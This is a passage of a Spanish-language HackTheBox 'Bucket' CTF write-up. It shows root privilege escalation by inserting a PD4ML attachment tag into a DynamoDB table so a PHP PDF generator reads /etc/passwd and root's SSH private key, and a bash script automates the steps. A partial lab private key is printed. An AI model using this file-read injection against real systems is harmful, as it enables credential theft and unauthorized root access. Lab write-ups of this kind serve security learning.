+&lt;?php
+require 'vendor/autoload.php';
+use Aws\DynamoDb\DynamoDbClient;
+if($_SERVER["REQUEST_METHOD"]==="POST") {
+        if($_POST["action"]==="get_alerts") {
+                date_default_timezone_set('America/New_York');
+                $client = new DynamoDbClient([
+                        'profile' =&gt; 'default',
+                        'region'  =&gt; 'us-east-1',
+                        'version' =&gt; 'latest',
+                        'endpoint' =&gt; 'http://localhost:4566'
+                ]);
+
+                $iterator = $client-&gt;getIterator('Scan', array(
+                        'TableName' =&gt; 'alerts',
+                        'FilterExpression' =&gt; "title = :title",
+                        'ExpressionAttributeValues' =&gt; array(":title"=&gt;array("S"=&gt;"Ransomware")),
+                ));
+
+                foreach ($iterator as $item) {
+                        $name=rand(1,10000).'.html';
+                        file_put_contents('files/'.$name,$item["data"]);
+                }
+                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
+        }
+}
+else
+{
+?&gt;
+</code></pre>
+
+<p>Algo medio extraño… Veamos de que se trata:</p>
+
+<ol>
+  <li>Si la petición que llega es un método <code>POST</code> y el atributo <code>action</code> es igual a <code>get_alerts</code>,</li>
+  <li>Crea un objeto mediante <code>DynamoDbClient</code> con 4 argumentos,</li>
+  <li>Para después hacer un <code>scan</code> (para ver el contenido de una tabla) a la tabla <code>alerts</code>, filtrando por el título <code>Ransomware</code>,</li>
+  <li>Posteriormente genera un nombre <strong>random</strong><code>.html</code>, extrae la data que obtuvo de la tabla y la guarda en el archivo <code>files/</code><strong>random</strong><code>.html</code>,</li>
+  <li>Ahora con <a href="https://pd4ml.com/index.htm"><code>PD4ML</code></a> genera un archivo <strong>.PDF</strong> tomando el archivo generado anteriormente, que está guardado en: <code>/var/www/bucket-app/files/$name</code> y guarda el resultado en la ruta <code>files/result.pdf</code>.</li>
+</ol>
+
+<blockquote>
+  <p><code>PD4ML</code> es una herramienta generadora de archivos PDF que usa HTML y CSS para obtener el formato.</p>
+</blockquote>
+
+<p>De lo anterior podemos deducir que <code>PD4ML</code> al estar guardando una ruta absoluta, podemos pasarle la ruta del archivo <code>root.txt</code> o incluso la de la llave <code>SSH privada</code> del usuario <strong>root</strong> para después de leer el <code>.PDF</code> ingresar a la máquina con ella.</p>
+
+<p>…</p>
+
+<p>Bueno, pues si revisamos las tablas que existen mediante <code>aws dynamodb</code> tenemos:</p>
+
+<pre><code class="language-bash">roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb list-tables
+{
+    "TableNames": [
+        "users"
+    ]
+}
+roy@bucket:/var/www/bucket-app$ 
+</code></pre>
+
+<p>Procedamos a crear la tabla <code>alerts</code> agregando el título <code>Ransomware</code>:</p>
+
+<pre><code class="language-bash">roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb --region us-east-1 create-table --table-name alerts \
+--attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
+--key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
+--provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5
+</code></pre>
+
+<p>Más info sobre creación y tablas:</p>
+
+<ul>
+  <li>Crear una tabla - <a href="https://docs.aws.amazon.com/es_es/amazondynamodb/latest/developerguide/getting-started-step-1.html">docs.aws/developerguide</a>.</li>
+  <li>Create a simple table in aws dynamodb - <a href="https://medium.com/@jerrythimothy/create-a-simple-table-in-aws-dynamodb-gui-cli-2b7a917a688b">Medium.com/jerrythimothy</a>.</li>
+  <li>Create table - <a href="https://docs.aws.amazon.com/cli/latest/reference/dynamodb/create-table.html">docs.aws/reference</a>.</li>
+  <li>Basic operations with tables, dynamodb - <a href="https://docs.amazonaws.cn/en_us/amazondynamodb/latest/developerguide/WorkingWithTables.Basics.html">docs.amazonaws/developerguide</a>.</li>
+  <li>Dynamodb CLI query examples - <a href="https://dynobase.dev/dynamodb-cli-query-examples/">dynobase.dev</a>.</li>
+</ul>
+
+<p>La respuesta de la ejecución es la siguiente:</p>
+
+<pre><code class="language-json">{
+    "TableDescription": {
+        "AttributeDefinitions": [
+            {
+                "AttributeName": "title",
+                "AttributeType": "S"
+            },
+            {
+                "AttributeName": "data",
+                "AttributeType": "S"
+            }
+        ],
+        "TableName": "alerts",
+        "KeySchema": [
+            {
+                "AttributeName": "title",
+                "KeyType": "HASH"
+            },
+            {
+                "AttributeName": "data",
+                "KeyType": "RANGE"
+            }
+        ],
+        "TableStatus": "ACTIVE",
+        "CreationDateTime": 1609778713.466,
+        "ProvisionedThroughput": {
+            "LastIncreaseDateTime": 0.0,
+            "LastDecreaseDateTime": 0.0,
+            "NumberOfDecreasesToday": 0,
+            "ReadCapacityUnits": 10,
+            "WriteCapacityUnits": 5
+        },
+        "TableSizeBytes": 0,
+        "ItemCount": 0,
+        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/alerts"
+    }
+}
+</code></pre>
+
+<p>Validamos:</p>
+
+<pre><code class="language-bash">roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb list-tables
+{
+    "TableNames": [
+        "alerts",
+        "users"
+    ]
+}
+</code></pre>
+
+<p>Y el contenido:</p>
+
+<pre><code class="language-bash">roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name alerts
+{
+    "Items": [],
+    "Count": 0,
+    "ScannedCount": 0,
+    "ConsumedCapacity": null
+}
+</code></pre>
+
+<p>La tabla es borrada en pocos segundos, así que debemos trabajar rápido…</p>
+
+<p>Agregamos data dentro de la tabla:</p>
+
+<ul>
+  <li>Using bash and aws CLI to interact with tables - <a href="https://blog.ruanbekker.com/blog/2018/08/14/tutorial-on-dynamodb-using-bash-and-the-aws-cli-tools-to-interact-with-a-music-dataset/">blog.ruanbekker.com</a>.</li>
+</ul>
+
+<pre><code class="language-bash">roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts \
+--item '{"Title": {"S": "Ransomware"}, "data": {"S": "/etc/passwd"}}'
+</code></pre>
+
+<pre><code class="language-json">{
+    "ConsumedCapacity": {
+        "TableName": "alerts",
+        "CapacityUnits": 1.0
+    }
+}
+</code></pre>
+
+<p>Validamos el contenido ahora:</p>
+
+<pre><code class="language-bash">roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name alerts
+</code></pre>
+
+<pre><code class="language-json">{
+    "Items": [
+        {
+            "title": {
+                "S": "Ransomware"
+            },
+            "data": {
+                "S": "/etc/passwd"
+            }
+        }
+    ],
+    "Count": 1,
+    "ScannedCount": 1,
+    "ConsumedCapacity": null
+}
+</code></pre>
+
+<p>Ahora nos quedaria realizar la petición <code>cURL</code> con el metodo <code>POST</code> y el atributo <code>action</code>:</p>
+
+<pre><code class="language-bash">roy@bucket:/var/www/bucket-app$ curl -X POST --data "action=get_alerts" http://localhost:8000/index.php
+</code></pre>
+
+<p>Obtenemos el archivo <code>result.pdf</code>:</p>
+
+<pre><code class="language-bash">roy@bucket:/var/www/bucket-app$ cd files
+roy@bucket:/var/www/bucket-app/files$ ls -la
+total 12
+drwxr-x---+ 2 root root 4096 Jan  5 02:23 .
+drwxr-x---+ 4 root root 4096 Sep 23 10:56 ..
+-rw-r--r--  1 root root 1633 Jan  5 02:23 result.pdf
+roy@bucket:/var/www/bucket-app/files$ cat result.pdf
+%PDF-1.4
+%
+1 0 obj
+% [24]
+&lt;&lt;
+/Filter /FlateDecode
+...
+</code></pre>
+
+<p>Pero entre toda la data no vemos nada relacionado con el archivo <code>/etc/passwd</code>. Acá estuve un buen tiempo atascado, así que recurrí de nuevo a <a href="https://www.hackthebox.eu/profile/49335">@TazWake</a> que me dio una mano con una página donde indica que <code>PD4ML</code> soporta archivos adjuntos mediante el tag: <code>&lt;pd4ml:attachment&gt;</code>, lo que nos permite adjuntar un archivo para ver o listar el contenido del mismo :P</p>
+
+<ul>
+  <li>PDF Attachments - <a href="https://pd4ml.com/cookbook/pdf-attachments.htm">pd4ml.com</a>.</li>
+</ul>
+
+<p>Lo curioso fue que después de un rato de jugar con esto encontré un tweet donde se hablaba de este descubrimiento y como explotarlo:</p>
+
+<ul>
+  <li>Playing with PD4ML API - <a href="https://twitter.com/akhilreni_hs/status/1219633535897817088">twitter.com/akhilreni_hs</a>.</li>
+</ul>
+
+<pre><code class="language-json">&lt;pd4ml:attachment description="attached.txt" icon="PushPin"&gt;file:///etc/passwd&lt;/pd4ml:attachment&gt;
+</code></pre>
+
+<p>Listo, pues intentemos agregar esta línea a la fila <code>data</code> de nuestra tabla y ejecutamos la petición con <code>cURL</code> a ver que sucede:</p>
+
+<pre><code class="language-bash">roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts \
+--item '{"title": {"S": "Ransomware"}, "data": {"S": "&lt;pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\"&gt;file:///etc/passwd&lt;/pd4ml:attachment&gt;"}}'
+</code></pre>
+
+<p>Escapamos las <code>""</code> (comillas) y le damos:</p>
+
+<pre><code class="language-bash">roy@bucket:/var/www/bucket-app/files$ curl -X POST --data "action=get_alerts" http://localhost:8000/index.php
+roy@bucket:/var/www/bucket-app/files$ cat result.pdf
+%PDF-1.4
+%
+1 0 obj
+% [24] 
+&lt;&lt;
+/Filter /FlateDecode
+...
+...
+/Params 5 0 R
+&gt;&gt;
+stream
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+...
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+roy:x:1000:1000:,,,:/home/roy:/bin/bash
+...
+</code></pre>
+
+<p>Perfectooooooooooooooooooo, tenemos la estructura del archivo <code>/etc/passwd</code> en nuestro resultado. Probemos a ver si el usuario <code>root</code> tiene llave privada en su <code>$HOME</code>:</p>
+
+<pre><code class="language-json">&lt;pd4ml:attachment description="attached.txt" icon="PushPin"&gt;file:///root/.ssh/id_rsa&lt;/pd4ml:attachment&gt;
+</code></pre>
+
+<pre><code class="language-bash">roy@bucket:/var/www/bucket-app/files$ aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts \
+--item '{"title": {"S": "Ransomware"}, "data": {"S": "&lt;pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\"&gt;file:///root/.ssh/id_rsa&lt;/pd4ml:attachment&gt;"}}'
+{
+    "ConsumedCapacity": {
+        "TableName": "alerts",
+        "CapacityUnits": 1.0
+    }
+}
+</code></pre>
+
+<pre><code class="language-bash">roy@bucket:/var/www/bucket-app/files$ curl -X POST --data "action=get_alerts" http://localhost:8000/index.php
+roy@bucket:/var/www/bucket-app/files$ cat result.pdf 
+%PDF-1.4
+%
+1 0 obj
+% [24] 
+&lt;&lt;
+/Filter /FlateDecode
+/Length 397
+&gt;&gt;
+stream
+...
+/Length 2602
+/Params 5 0 R
+&gt;&gt;
+stream
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAx6VphKMyxurjldmb6dy1OSn0D9dumFAUCeSoICwhhsq+fadx21SU
+bQr/unofKrmgNMAhjmrHCiMapmDw1dcyj4PSPtwo6IvrV0Guyu34Law1Eav9sV1hgzDLm8
+9tAB7fh2JN8OB/4dt0sWxHxzWfCmHF5DBWSlxdk+K4H2vJ+eTA2FxT2teLPmJd7G9mvanh
+1VtctpCOi6+CMcv1IMvdFtBLbieffTAOF1rSJds4m00MpqqwDiQdgN5ghcOubTXi3cbjz9
+uCTBtXO2dcLfHAqhqYSa7eM0x5pwX54Hr9SP0qJp5y0ueraiOdoSJD5SmgBfIfCzUDZAMn
+de3YGZ0Q4a86BVgsD2Vl54+9hoLOYMsiV9g4S76+PmBiuwi/Wrxtoyzr3/htJVmCpm+WfO
+r4QQZyCFAVo21sLfIqMcPBqlur5FvrWtUUCA0usfx/j40V/l5WAIioIOX0XmX0kll1f6P7
+1+d/BXAQNvyt/aOennafgvzsj23w5m4sOTBNOgBlAAAFiC6rIUsuqyFLAAAAB3NzaC1yc2
+EAAAGBAMelaYSjMsbq45XZm+nctTkp9A/XbphQFAnkqCAsIYbKvn2ncdtUlG0K/7p6Hyq5
+oDTAIY5qxwojGqZg8NXXMo+D0j7cKOiL61dBrsrt+C2sNRGr/bFdYYMwy5vPbQAe34diTf
+Dgf+HbdLFsR8c1nwphxeQwVkpcXZPiuB9ryfnkwNhcU9rXiz5iXexvZr2p4dVbXLaQjouv
+gjHL9SDL3RbQS24nn30wDhda0iXbOJtNDKaqsA4kHYDeYIXDrm014t3G48/bgkwbVztnXC
+...
+</code></pre>
+
+<p>La copiamos, guardamos en un archivo, le damos los permisos necesarios: <code>chmod 700 keyroot</code> e intentamos ingresar mediante <code>SSH</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283bash_log_with_idRsa_root.png" alt="283bash_log_with_idRsa_root" /></p>
+
+<p>OPAAAAAAAAAAAAAAa tamos dentro compita (: Solo nos quedarían por ver las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283flags.png" alt="283flags" /></p>
+
+<p>…</p>
+
+<p><strong>Nota:</strong></p>
+
+<blockquote>
+  <p>Como vimos lo que explotamos no fue la ruta absoluta que había comentado que probablemente podríamos cambiar, sino que nos aprovechamos de un feature de la herramienta y de un proceso que llama la herramienta. Ya que el archivo <code>index.php</code> lee el contenido de la tabla y extrae la fila <code>data</code> para guardarla en un archivo, de ese archivo es que se genera el PDF (: Muy lindo la verdad.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>En resumen, el proceso para ver el contenido de la bandera del usuario <code>root</code> sería algo así plasmado en un script (ya que la tabla es borrada en pocos segundos):</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+#Create table `alerts`
+aws --endpoint-url=http://localhost:4566 dynamodb --region us-east-1 create-table --table-name alerts \
+        --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
+        --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
+        --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5
+
+#Validate creation
+aws --endpoint-url=http://localhost:4566 dynamodb list-tables
+
+#Add data to the table
+aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts \
+        --item '{"title": {"S": "Ransomware"}, "data": {"S": "&lt;pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\"&gt;file:///root/root.txt&lt;/pd4ml:attachment&gt;"}}'
+
+#Validate data inside table
+aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name alerts
+
+#Generate PDF
+curl -X POST --data "action=get_alerts" http://localhost:8000/index.php
+
+#Read `result.pdf`
+cat /var/www/bucket-app/files/result.pdf
+</code></pre>
+
+<p>…</p>
+
+<p>Es todo por esta máquina. Muy linda y entretenida, como casi siempre hay momentos en los que me súper pierdo, pero bueno de eso se trata, aprender de todos los tropiezos.</p>
+
+<p>El privesc me pareció muy loco… Pero muy original y a la vez que miedito, todo lo que puede causar un archivo con inputs :P</p>
+
+<p>Por ahora no es más, nos leeremos en otra ocasión, gracias por leer y espero les haya servido. A seguir rompiendo todo 😊</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Bucket&url=http://localhost:4000/htb/bucket" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#AWS-CLI">AWS-CLI</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#PD4ML">PD4ML</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#ssh-keys">ssh-keys</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/sink">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313banner.png" alt="HackTheBox - Sink"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/sink">HackTheBox - Sink</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel desquiciado. Nos enfrentaremos a un HTTP Request Smuggling (loco loco), saltaremos entre usuarios aún más locos, veremos commits relacionados a pasos a producción y pruebas extrañas con...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">18 Sep 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/waldo">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149banner.png" alt="HackTheBox - Waldo"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/waldo">HackTheBox - Waldo</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina linux nivel medio. Los lindos LFI, jugueteo con SSH, llaves privadas traviesas, bypass de shells restringidas yyyyyy cositas con las CAPAcidades BILITIESas.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">09 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/thenotebook">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" alt="HackTheBox - TheNotebook"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/thenotebook">HackTheBox - TheNotebook</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">31 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
